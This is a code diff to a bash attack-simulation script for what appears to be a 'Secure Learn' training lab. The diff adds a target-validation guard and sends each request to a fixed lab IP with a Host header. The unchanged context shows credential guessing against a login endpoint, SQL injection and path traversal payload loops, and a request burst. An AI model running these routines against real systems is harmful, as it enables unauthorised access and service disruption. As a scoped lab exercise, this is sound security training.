@@ -4,6 +4,24 @@
 
 set -e
 
+# Resolve the repository copy when run from source and the read-only mounted
+# copy when run in the attack container. No external command runs before the
+# target profile is validated.
+ATTACK_SCRIPT_PATH="${BASH_SOURCE[0]}"
+ATTACK_SCRIPT_DIR="${ATTACK_SCRIPT_PATH%/*}"
+if [[ "$ATTACK_SCRIPT_DIR" == "$ATTACK_SCRIPT_PATH" ]]; then
+    ATTACK_SCRIPT_DIR=.
+fi
+if [[ -r "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh" ]]; then
+    source "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh"
+elif [[ "$ATTACK_SCRIPT_DIR" == "/scripts" && -r "/secure-learn-target-guard.sh" ]]; then
+    source "/secure-learn-target-guard.sh"
+else
+    echo "ERROR: Secure Learn target guard is unavailable." >&2
+    exit 64
+fi
+secure_learn_validate_target
+
 # Configuration
 TARGET="${TARGET:-app}"
 TARGET_IP="${TARGET_IP:-172.23.0.20}"
@@ -67,7 +85,7 @@ echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
 echo "" >> "$REPORT_FILE"
 
 # Check what service is running
-curl -s -I "http://$TARGET:$TARGET_PORT/" 2>/dev/null | head -10 | tee -a "$REPORT_FILE"
+curl -s -I -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" 2>/dev/null | head -10 | tee -a "$REPORT_FILE"
 
 echo ""
 echo "Waiting ${DELAY}s before next phase..."
@@ -96,7 +114,8 @@ for cred in "${credentials[@]}"; do
     user=$(echo "$cred" | cut -d: -f1)
     pass=$(echo "$cred" | cut -d: -f2)
     
-    response=$(curl -s -X POST "http://$TARGET:$TARGET_PORT/auth/login" \
+    response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
+        -H "Host: $TARGET" \
         -H "Content-Type: application/json" \
         -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
         -w "\nHTTP_CODE:%{http_code}")
@@ -142,7 +161,7 @@ for payload in "${sqli_payloads[@]}"; do
     echo "- Payload: \`$payload\`" >> "$REPORT_FILE"
     
     response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
-        "http://$TARGET:$TARGET_PORT/users?id=$encoded" 2>/dev/null)
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users?id=$encoded" 2>/dev/null)
     
     http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
     echo "  Response: HTTP $http_code"
@@ -176,7 +195,7 @@ for payload in "${traversal_payloads[@]}"; do
     echo "- Payload: \`$payload\`" >> "$REPORT_FILE"
     
     response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
-        "http://$TARGET:$TARGET_PORT/files/$payload" 2>/dev/null)
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/files/$payload" 2>/dev/null)
     
     http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
     echo "  Response: HTTP $http_code"
@@ -204,7 +223,7 @@ failed=0
 
 for i in $(seq 1 50); do
     response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
-        "http://$TARGET:$TARGET_PORT/" 2>/dev/null || echo "000")
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" 2>/dev/null || echo "000")
     
     case $response in
         200) ((success += 1)) ;;
